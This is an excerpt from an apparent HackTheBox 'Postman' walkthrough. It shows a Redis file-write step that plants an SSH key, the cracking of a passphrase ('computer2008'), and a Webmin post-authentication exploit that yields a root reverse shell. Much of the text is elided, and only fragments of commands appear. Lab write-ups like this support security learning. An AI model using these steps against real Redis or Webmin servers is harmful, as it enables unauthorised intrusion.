...
tags: [htb, webmin, cve-2019-12840, linpeas, metasploit, ssh2john]
...
### Redis Remote Code Execution via Arbitrary File Write
...
```bash
6379> config set dir /var/lib/redis/.ssh/
OK
...
```bash
chmod 600 id_rsa
ssh -i id_rsa redis@<target>
```

![](/assets/img/postman/Pasted_image_20260911165815.png)

Successful SSH connection established as the `redis` user with shell access to the target machine.

### Exposed Private SSH Key Discovery and Credential Cracking
...
![](/assets/img/postman/Pasted_image_20260914173526.png)
...
![](/assets/img/postman/Pasted_image_20260911165842.png)

**Result:** The password for Matt's SSH key is `computer2008`
...
### Webmin Post-authentication Remote Code Execution
...
```
URL: https://<target>:10000
Username: Matt
Password: computer2008
```

![](/assets/img/postman/Pasted_image_20260911165903.png)

Successfully authenticated to Webmin dashboard. The interface displays system administration options including package management and service controls.
...
![](/assets/img/postman/Pasted_image_20260911165919.png)

The exploit successfully triggers command execution on the target system with root-level privileges. A reverse shell is established, providing interactive access as the root user.
